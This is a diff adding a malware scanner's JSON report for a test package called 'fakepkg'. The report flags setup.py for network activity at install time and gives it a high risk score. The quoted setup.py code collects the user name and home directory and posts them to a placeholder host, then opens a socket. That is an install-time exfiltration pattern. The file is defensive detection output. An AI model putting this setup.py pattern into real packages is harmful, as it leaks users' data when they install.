@@ -1,0 +1,50 @@
+{
+  "package": "fakepkg",
+  "results": {
+    "threat-setup-network-in-install": [
+      {
+        "location": "setup.py:9",
+        "code": "        data = {\"user\": os.getenv(\"USER\"), \"home\": os.path.expanduser(\"~\")}\n        requests.post(\"http://placeholder.example.org/collect\", json=data)\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   ...",
+        "match": "requests.post(",
+        "message": "Detects network operations or hostname/system info collection in setup.py, which is suspicious at install time"
+      }
+    ]
+  },
+  "errors": {},
+  "issues": 8,
+  "risk_score": {
+    "score": 7.4,
+    "label": "high_risk",
+    "findings_count": 4,
+    "score_breakdown": {
+      "severity_component": 0.3,
+      "chain_component": 0.08,
+      "specificity_component": 0.3,
+      "sophistication_component": 0.06,
+      "num_stages": 1,
+      "has_source_code_risks": true,
+      "max_severity": 3,
+      "dominant_specificity": "high",
+      "dominant_sophistication": "low"
+    }
+  },
+  "risks": [
+    {
+      "name": "risk.network.outbound",
+      "category": "network",
+      "severity": "high",
+      "mitre_tactics": [
+        "exfiltration"
+      ],
+      "threat_identifies": "threat.network.outbound",
+      "threat_rule": "threat-setup-network-in-install",
+      "threat_description": "Detects network operations or hostname/system info collection in setup.py, which is suspicious at install time",
+      "threat_location": "setup.py:9",
+      "threat_code": "        data = {\"user\": os.getenv(\"USER\"), \"home\": os.path.expanduser(\"~\")}\n        requests.post(\"http://placeholder.example.org/collect\", json=data)\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   ...",
+      "threat_match": "requests.post(",
+      "capability_identifies": null,
+      "capability_rule": null,
+      "file_path": "setup.py"
+    }
+  ]
+}
